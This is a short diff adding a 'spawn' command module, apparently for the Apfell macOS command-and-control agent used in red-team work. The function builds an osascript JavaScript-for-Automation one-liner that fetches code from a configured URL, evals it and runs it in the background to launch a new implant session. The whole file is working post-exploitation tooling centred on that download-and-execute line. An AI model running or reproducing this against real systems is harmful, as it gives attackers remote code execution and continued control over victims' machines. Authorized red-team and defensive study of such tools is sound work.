@@ -1,0 +1,24 @@
+exports.spawn = function(task, command, params){
+    try{
+        config = JSON.parse(params);
+        if(config['method'] == "shell_api"){
+            if(config['type'] == "oneliner"){
+                if(config['payload-type'] == "apfell-jxa"){
+                    //full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
+                    full_url = config['url'];
+                    path = "/usr/bin/osascript";
+                    args = ['-l','JavaScript','-e'];
+                    command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
+                    command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
+                    args.push(command);
+                    args.push("&");
+
+                    return commands_dict["shell_api"](null, null, JSON.stringify({"path": path, "args": args}));
+                }
+            }
+        }
+    }catch(error){
+        return error.toString();
+    }
+};
+COMMAND_ENDS_HERE
